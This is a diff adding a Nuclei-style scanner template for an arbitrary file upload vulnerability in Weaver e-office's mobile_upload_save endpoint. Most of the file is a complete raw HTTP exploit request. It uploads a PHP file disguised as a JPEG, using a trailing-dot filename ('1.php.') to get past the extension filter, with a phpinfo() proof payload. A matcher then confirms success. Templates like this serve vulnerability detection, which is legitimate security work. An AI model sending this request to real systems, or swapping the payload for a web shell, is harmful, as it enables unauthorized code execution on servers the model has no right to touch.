@@ -1,0 +1,39 @@
+id: Weaver_e-office_mobile_upload_save_fileupload
+
+info:
+  name: Weaver_e-office_mobile_upload_save_fileupload
+  author: security-xm
+  severity: high
+  description: 泛微e-officemobile_upload_save接口存在任意文件上传漏洞接口存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |
+    @timeout: 30s
+    POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+    Connection: close
+    Content-Length: 204
+
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+    Content-Disposition: form-data; name="upload_quwan"; filename="1.php."
+    Content-Type: image/jpeg
+
+    <?php phpinfo();?>
+    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - attachment
